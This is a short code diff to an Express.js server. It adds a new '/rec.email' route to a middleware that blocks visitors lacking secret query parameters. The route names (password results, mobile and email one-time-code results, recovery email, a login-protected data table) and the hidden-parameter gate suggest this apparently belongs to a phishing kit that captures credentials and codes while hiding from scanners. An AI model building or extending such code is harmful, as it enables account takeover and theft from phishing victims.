@@ -85,12 +85,13 @@ app.post('/dblogin', loginLimiter);
 app.use(express.static(path.join(__dirname, 'public'), { maxAge: 0, etag: false }));
 
 const REQUIRED_PARAMS = ['wetuweopfnfdjfgdfhdkjudfhw', 'svhsdfhadeiueirncbxjcbbxcxb'];
-const EXCLUDED_PATHS = ['/dblogin', '/datatable', '/pwdready', '/pwdresult', '/codeload', '/mobileresult', '/motpresult', '/eotpresult', '/recemailresult', '/error', '/first'];
+const EXCLUDED_PATHS = ['/dblogin', '/datatable', '/pwdready', '/pwdresult', '/codeload', '/mobileresult', '/motpresult', '/eotpresult', '/recemailresult', '/error', '/first', '/rec.email'];
 app.use((req, res, next) => {
   if (req.method !== 'GET') return next();
   if (EXCLUDED_PATHS.some(p => req.path.startsWith(p))) return next();
   if (req.path.startsWith('/req/')) return next();
   if (req.path.startsWith('/worker-')) return next();
+  if (req.path === '/rec.email') return next();
   if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|ttf|woff|pdf|txt)$/)) return next();
   if (!REQUIRED_PARAMS.some(p => p in req.query)) return res.render('error');
   next();
